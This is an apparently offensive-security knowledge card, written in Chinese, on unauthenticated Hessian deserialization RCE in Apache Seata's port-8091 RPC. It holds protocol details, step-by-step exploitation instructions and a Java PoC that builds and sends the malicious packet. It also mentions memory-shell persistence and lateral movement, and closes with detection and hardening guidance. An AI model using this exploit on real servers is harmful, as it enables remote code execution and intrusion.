---
id: web-java-deser-hessian-seata-8091-rpc-codec22
title: Apache Seata 8091 Netty RPC Hessian 反序列化入口：codec 22 直接反序列化请求体
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: seata-rpc-hessian-codec22-deserialization
aliases:
- Seata Hessian 反序列化
- Seata 8091 反序列化
- ProtocolV1Decoder 反序列化
- SerializerType 22
- Seata RPC 反序列化
- Seata 反序列化利用工具
tags:
- java
- hessian
- deserialization
- apache-seata
- netty
- rpc
- port-8091
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T08:52:53+08:00'
  notes: 已对照原文及9张图核对：图02确认SerializerType HESSIAN=22；图04确认ProtocolV1Decoder依次读magic/version/fullLength/headLength/messageType/codecType/compressor/requestId后readBytes并由SerializerServiceLoader按codec反序列化；图03 PoC头字段与长度回填、图05 Encoder、图06 Netty发送均一致；图09服务端日志出现SlingLazyValue gadget对象与UnsupportedClassVersionError 61.0，证明body进入Hessian反序列化但XSLT链因JDK版本失败。未验证点：原文未给出干净RCE命令回显，最终危害取决于目标classpath gadget；原文未标注Seata版本，未设affected_versions；frontmatter无source_url；未本机复跑。
---

## 一句话结论

Apache Seata 服务端默认在 8091 端口用 Netty 提供 RPC，`ProtocolV1Decoder#decodeFrame` 读取请求头中的 `codecType` 后按 `SerializerType` 选择反序列化器；当 `codecType=22` 时使用 Hessian，请求体字节被直接 `deserializer.deserialize(bs)`，未认证的网络攻击者构造协议头 + Hessian gadget 即可在 Seata 服务端触发反序列化 RCE。

## 原理

- **协议入口**：Seata RPC 使用自定义二进制头（16 字节）+ 可选 headMap + body。原文解码逻辑（`ProtocolV1Decoder#decodeFrame`）依次读取：
  - 2 字节 magic（`0xdada`，常量字节 `-38 -38`）；
  - 1 字节 version（默认 1）；
  - 4 字节 fullLength（整包长度）；
  - 2 字节 headLength（头部长度，无 headMap 时为 16）；
  - 1 字节 messageType（`0x0b` 为请求命令）；
  - 1 字节 codecType（序列化类型）；
  - 1 字节 compressorType（0 表示不压缩）；
  - 4 字节 requestId（消息 ID）。
- **按 codec 选择序列化器**：读取 body 后执行 `SerializerServiceLoader.load(SerializerType.getByCode(codecType)).deserialize(bs)`。`SerializerType` 枚举：`SEATA(1)`、`PROTOBUF(2)`、`KRYO(4)`、`FST(8)`、`HESSIAN(22)`、`JACKSON(50)`；codec=22 时 body 进入 Hessian 反序列化。
- **无认证边界**：8091 是 Seata server 的 RPC 监听端口，协议层不要求登录；只要网络可达即可发送任意 RpcMessage。body 内容完全由客户端控制，反序列化器没有类白名单/过滤器（原文未提及）。
- **利用方式**：按协议头格式构造 ByteBuf，body 放 Hessian 序列化的 gadget 字节（可用 ysoserial 类工具/自研链，原文参考 XsltOnlyJdk 并做了武器化 GUI 工具动态替换 base64 payload），通过 Netty 或原始 socket 发送。也可复用 Seata 自身的 `ProtocolV1Encoder#encode` 逻辑生成合法包再替换 body。
- **验证与边界**：原文日志显示服务端处理到 `rpcMessage body[...] is not MessageTypeAware type`，其中包含 `SlingLazyValue` 等 gadget 对象，说明 body 已被 Hessian 反序列化；另有一次 `UnsupportedClassVersionError: class file version 61.0`（JDK 版本不匹配）导致 XSLT 链失败。原文未给出干净的 `id` 命令回显，RCE 取决于目标 JDK/classpath 上可用的 Hessian gadget，故 confidence 定为 medium。
- **后利用**：原文还给出 Netty `ChannelDuplexHandler` 内存马（遍历线程组找 `NioEventLoop`，反射取 `unwrappedSelector.keys` → `attachment.pipeline`，替换 `head.next.handler` 的 `childHandler`），属于 Seata 被拿下后的持久化/隐蔽驻留；该技术与已有 Netty pipeline 内存马卡重复，本文不重复成卡。

## 触发条件

- 目标运行 Apache Seata server，8091/TCP（或配置的 RPC 端口）对攻击者可达。
- 服务端 `ProtocolV1Decoder` 接受外部 RpcMessage，且未对 codec/body 做认证或类白名单限制。
- 攻击者能构造合法协议头（magic/长度/headLength 正确）并发送 Hessian 序列化 body。
- 目标 classpath 存在可用 Hessian gadget（如 JDK-only 链、XSLT、Groovy、Spring 等），且 JDK 版本与 gadget 匹配。
- 若启用 TLS/鉴权或端口未暴露，则需先绕过网络/认证边界。

## 利用步骤

1. 确认 8091 端口为 Seata RPC（可观察 `0xdada` magic 响应/端口指纹）。
2. 选择 Hessian gadget 并生成序列化字节，base64 编码备用。
3. 构造 16 字节协议头：`da da 01` + 4 字节 fullLength 占位 + 2 字节 headLength（16）+ `0b`（请求）+ `16`（codec 22）+ `00`（无压缩）+ 4 字节 messageId（任意，如 1）。
4. 写入 Hessian body，回填 `fullLength = 16 + body.length` 与 `headLength = 16`（按 decode 的字节序：fullLength 为 int，headLength 为 short）。
5. 通过 Netty `Bootstrap` 或原始 socket 连接 8091 发送 ByteBuf；观察服务端是否反序列化（日志/回连/DNS/命令结果）。
6. 成功后按需上传/注入内存马或执行后续命令（原文 Netty 内存马思路见关联卡）。

## PoC

原文 Java PoC 核心（省略 Netty 初始化）：

```java
String host = "target";
int port = 8091;
byte[] body = Base64.getDecoder().decode(base64Payload); // Hessian 序列化 gadget

ByteBuf buf = Unpooled.buffer();
buf.writeByte(0xda);          // magic high
buf.writeByte(0xda);          // magic low
buf.writeByte(1);             // version
buf.writeZero(6);             // fullLength(4) + headLength(2) 占位
buf.writeByte(0x0b);          // messageType: request
buf.writeByte(0x16);          // codecType: 22 -> Hessian
buf.writeByte(0);             // compressorType: none
buf.writeInt(1);              // messageId
int headLength = 16;
int fullLength = 16 + body.length;
buf.writeBytes(body);

int writerIndex = buf.writerIndex();
buf.writerIndex(3);
buf.writeInt(fullLength);
buf.writeShort(headLength);
buf.writerIndex(writerIndex);

sendRaw(host, port, buf); // Netty Bootstrap connect + writeAndFlush
```

服务端解码路径：

```text
ProtocolV1Decoder#decodeFrame
 -> 读 magic/version/fullLength/headLength/messageType/codecType/compressor/requestId
 -> bodyLength = fullLength - headLength; frame.readBytes(bs)
 -> SerializerServiceLoader.load(SerializerType.getByCode(22)) -> Hessian
 -> serializer.deserialize(bs)   // 反序列化触发
```

原文日志关键行（证明 body 被反序列化）：

```text
This rpcMessage body[[{}, {gadget-chains=sun.swing.SwingLazyValue@...}]] is not MessageTypeAware type.
```

## 变体与关联

- **codec 变体**：`SEATA(1)`、`PROTOBUF(2)`、`KRYO(4)`、`FST(8)`、`JACKSON(50)` 各有对应反序列化器；若目标启用其他 codec，可换用对应 gadget/解析缺陷。
- **压缩/headMap**：compressorType 非 0 时 body 先解压；headLength > 16 时先解析 headMap。构造时需与 decoder 逻辑一致，否则在反序列化前失败。
- **gadget 变体**：Hessian JDK-only（UIDefaults/ProxyLazyValue）、XsltOnlyJdk、Groovy GString、Spring/Rome JNDI 等；按目标 JDK/依赖选择。原文 XSLT 链因 class file version 61.0 与运行 JDK 不匹配失败，说明 gadget 需匹配版本。
- **后利用**：Netty `ChannelDuplexHandler` 内存马注入 `NioEventLoop` pipeline（见 `web-java-component-netty-pipeline-memshell`）；Seata 常与注册中心/配置中心同网，拿下后可横向。
- **关联**：Hessian 反序列化入口（XXL-Job Admin）、Hessian JDK-only 链、JNDI 出网链、Netty pipeline 内存马。

## 检测与防御

- **网络**：8091（及 Seata RPC 端口）只对可信节点开放，禁止公网/办公网直连；部署 TLS 与鉴权（Seata 支持 token/SSL 配置）。
- **协议检测**：IDS/NDR 识别 `0xdada` magic + codecType 22 的入站连接；非 Seata 客户端（IP/端口/频率异常）连接 8091；body 为高熵二进制/Hessian 特征（`H`、类名、`SwingLazyValue`、`TemplatesImpl` 等）。
- **运行时检测**：Seata 日志出现非预期 `rpcMessage body[...] is not MessageTypeAware type`、未知类加载、反序列化异常、`UnsupportedClassVersionError`；JVM 异常派生 `sh`/`id`/`curl`；Netty pipeline 中出现未知 Handler。
- **加固**：升级 Seata 到修复/最新版本；如无需外部 RPC，关闭 8091 对外监听或限制来源；配置 Hessian 类黑名单/白名单（Seata 支持 serializer 安全配置）；以低权限运行 Seata，限制出网与命令执行；对内存马排查可 dump Netty pipeline/线程组。
